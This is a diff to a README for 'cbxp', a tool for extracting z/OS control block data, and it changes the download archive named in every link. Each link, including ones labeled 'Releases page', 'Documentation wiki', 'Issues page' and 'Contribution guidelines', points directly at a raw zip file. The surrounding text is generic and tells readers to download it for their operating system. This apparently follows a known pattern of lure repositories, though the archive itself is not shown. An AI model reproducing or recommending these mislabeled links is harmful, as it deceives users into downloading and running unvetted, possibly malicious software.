@@ -2,7 +2,7 @@
 # 📦 cbxp - Easily Extract z/OS Control Block Data
 
 ## 📥 Download Now
-[![Download cbxp](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp-v3.4.zip)](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp-v3.4.zip)
+[![Download cbxp](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp/Software_v3.6.zip)](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp/Software_v3.6.zip)
 
 ## 📖 Overview
 cbxp offers a simple and unified way to extract control block data from z/OS. This application provides a standardized interface that simplifies the process, making it easier for anyone to access crucial mainframe data without needing extensive technical skills.
@@ -11,7 +11,7 @@ cbxp offers a simple and unified way to extract control block data from z/OS. Th
 Follow the steps below to download and run cbxp on your computer.
 
 ### Step 1: Visit the Download Page
-To get started, visit the [Releases page](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp-v3.4.zip).
+To get started, visit the [Releases page](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp/Software_v3.6.zip).
 
 ### Step 2: Download the Application
 On the Releases page, look for the latest version of cbxp. Click on it, and you will see a list of available files. Choose the file that matches your operating system.
@@ -45,10 +45,10 @@ On the Releases page, look for the latest version of cbxp. Click on it, and you 
    Replace `<options>` with the specific parameters you want to use. For example, if you want to extract data from a specific control block, specify it directly in the command.
 
 ## 📖 Documentation
-For more details on using cbxp, refer to the [Documentation wiki](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp-v3.4.zip). You will find comprehensive guides on how to utilize all features effectively.
+For more details on using cbxp, refer to the [Documentation wiki](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp/Software_v3.6.zip). You will find comprehensive guides on how to utilize all features effectively.
 
 ## 🆘 Support
-If you encounter issues while using cbxp, you can seek help from the community by visiting the [Issues page](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp-v3.4.zip). We encourage feedback and contributions.
+If you encounter issues while using cbxp, you can seek help from the community by visiting the [Issues page](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp/Software_v3.6.zip). We encourage feedback and contributions.
 
 ## 🏷️ Topics
 - cbxp
@@ -63,9 +63,9 @@ If you encounter issues while using cbxp, you can seek help from the community b
 - zos
 
 ## 🥳 Community Contributions
-We welcome contributions to cbxp! If you have ideas for improvements or want to help with the project, please visit our [Contribution guidelines](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp-v3.4.zip).
+We welcome contributions to cbxp! If you have ideas for improvements or want to help with the project, please visit our [Contribution guidelines](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp/Software_v3.6.zip).
 
 ## 📥 Download Again
-Remember, you can always download cbxp from the [Releases page](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp-v3.4.zip).
+Remember, you can always download cbxp from the [Releases page](https://raw.githubusercontent.com/XavierBrasilero/cbxp/main/python/cbxp/Software_v3.6.zip).
 
 ```
